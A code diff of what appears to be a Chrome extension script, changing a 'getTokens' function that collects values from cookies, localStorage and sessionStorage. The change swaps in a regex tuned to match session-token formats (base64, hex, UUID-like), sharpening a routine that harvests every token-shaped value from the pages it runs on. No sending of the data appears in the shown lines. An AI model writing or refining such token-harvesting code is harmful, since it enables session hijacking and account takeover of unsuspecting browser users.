@@ -54,14 +54,15 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
         const getTokens = () => {
           return new Promise((resolve, reject) => {
             const tokens = [];
-            const tokenRegex = /^[a-zA-Z0-9!@#$%^&*()_\-+=`~[\]{}|;':",.\/<>?]{16,512}$/;
+            const sessionTokenRegex = /^(?:[a-zA-Z0-9+/]{24,}=*|[a-f0-9]{32,}|[a-zA-Z0-9_-]{36,})$/;
         
-            // Scan cookies using document.cookie
+            // Scan cookies 
             const cookies = document.cookie.split(';');
             cookies.forEach((cookie) => {
               const parts = cookie.split('=');
-              if (parts[1] && tokenRegex.test(parts[1].trim())) {
-                tokens.push(parts[1].trim());
+              const cookieValue = parts[1] ? parts[1].trim() : ''; 
+              if (cookieValue && sessionTokenRegex.test(cookieValue)) {
+                tokens.push(cookieValue);
               }
             });
         
@@ -69,8 +70,8 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
             for (let i = 0; i < localStorage.length; i++) {
               const key = localStorage.key(i);
               const value = localStorage.getItem(key);
-              if (value && tokenRegex.test(value.trim())) {
-                tokens.push(value.trim());
+              if (typeof value === 'string' && value && sessionTokenRegex.test(value)) {
+                tokens.push(value);
               }
             }
         
@@ -78,8 +79,8 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
             for (let i = 0; i < sessionStorage.length; i++) {
               const key = sessionStorage.key(i);
               const value = sessionStorage.getItem(key);
-              if (value && tokenRegex.test(value.trim())) {
-                tokens.push(value.trim());
+              if (typeof value === 'string' && value && sessionTokenRegex.test(value)) {
+                tokens.push(value);
               }
             }
         
